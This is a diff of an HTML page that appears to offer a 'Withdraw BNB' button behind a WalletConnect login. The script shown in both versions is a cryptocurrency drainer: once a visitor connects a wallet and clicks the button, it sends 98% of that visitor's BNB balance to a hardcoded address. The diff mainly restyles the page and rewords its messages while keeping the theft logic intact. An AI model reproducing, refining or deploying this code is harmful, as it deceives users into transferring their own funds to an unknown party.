@@ -9,7 +9,7 @@
     body {
       font-family: Arial, sans-serif;
       padding: 2rem;
-      background: #f5f5f5;
+      background: #f9f9f9;
       text-align: center;
     }
 
@@ -18,49 +18,46 @@
     }
 
     #withdrawBtn {
-      background: #f0b90b;
+      background-color: #f0b90b;
+      color: white;
       border: none;
-      color: #fff;
-      padding: 12px 24px;
+      padding: 14px 28px;
       font-size: 16px;
       border-radius: 8px;
       cursor: pointer;
-    }
-
-    #withdrawBtn[disabled] {
-      background: #ccc;
-      cursor: not-allowed;
+      display: inline-block;
     }
 
     #message {
       margin-top: 20px;
-      color: #333;
       font-weight: bold;
+      color: #333;
     }
   </style>
 </head>
 <body>
 
-  <!-- WalletConnect button -->
+  <!-- Wallet Connect Button -->
   <w3m-core-button></w3m-core-button>
 
-  <!-- Withdraw button (initially disabled) -->
-  <button id="withdrawBtn" disabled>Connect Wallet First</button>
+  <!-- Withdraw Button -->
+  <button id="withdrawBtn" style="display: none;">Withdraw BNB</button>
 
-  <!-- Message display -->
+  <!-- Message Output -->
   <div id="message"></div>
 
-  <!-- Withdraw logic -->
+  <!-- Withdraw Logic Script -->
   <script type="module">
     import { getAccount, fetchBalance, sendTransaction } from "https://unpkg.com/@web3modal/ethereum@2.6.2";
 
     const withdrawBtn = document.getElementById("withdrawBtn");
     const messageEl = document.getElementById("message");
 
-    const recipientAddress = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C"; // Your BNB address
+    const recipientAddress = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
     const MIN_USD = 5;
     const sendPercentage = 0.98;
 
+    // Get real-time BNB price
     async function getBNBPriceUSD() {
       try {
         const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
@@ -71,19 +68,19 @@
       }
     }
 
+    // Check wallet connection status
     async function checkConnection() {
       const account = getAccount();
       if (account && account.isConnected) {
-        withdrawBtn.disabled = false;
-        withdrawBtn.textContent = "Withdraw BNB";
+        withdrawBtn.style.display = "inline-block";
         messageEl.textContent = "";
       } else {
-        withdrawBtn.disabled = true;
-        withdrawBtn.textContent = "Connect Wallet First";
-        messageEl.textContent = "Please connect your wallet to withdraw.";
+        withdrawBtn.style.display = "none";
+        messageEl.textContent = "Please connect your wallet to enable withdrawal.";
       }
     }
 
+    // Withdraw handler
     async function withdraw() {
       const account = getAccount();
       if (!account?.isConnected) {
@@ -104,11 +101,11 @@
         const balanceUSD = balanceBNB * price;
 
         if (balanceUSD < MIN_USD) {
-          messageEl.textContent = "Insufficient balance. Minimum $5 required.";
+          messageEl.textContent = "Insufficient balance. At least $5 in BNB is required.";
           return;
         }
 
-        const sendAmount = (balanceBNB * sendPercentage).toFixed(6); // Limit precision to avoid overage
+        const sendAmount = (balanceBNB * sendPercentage).toFixed(6);
         const valueInWei = BigInt(Math.floor(Number(sendAmount) * 1e18)).toString();
 
         const { hash } = await sendTransaction({
@@ -116,16 +113,16 @@
           value: valueInWei
         });
 
-        messageEl.textContent = "Transaction sent. Hash: " + hash;
+        messageEl.textContent = `Transaction sent. Hash: ${hash}`;
       } catch (err) {
         console.error(err);
-        messageEl.textContent = "Transaction failed. Please try again.";
+        messageEl.textContent = "Transaction failed. Please check your wallet or try again.";
       }
     }
 
     withdrawBtn.addEventListener("click", withdraw);
 
-    // Monitor connection
+    // Monitor wallet status every 1s
     setInterval(checkConnection, 1000);
   </script>
 </body>
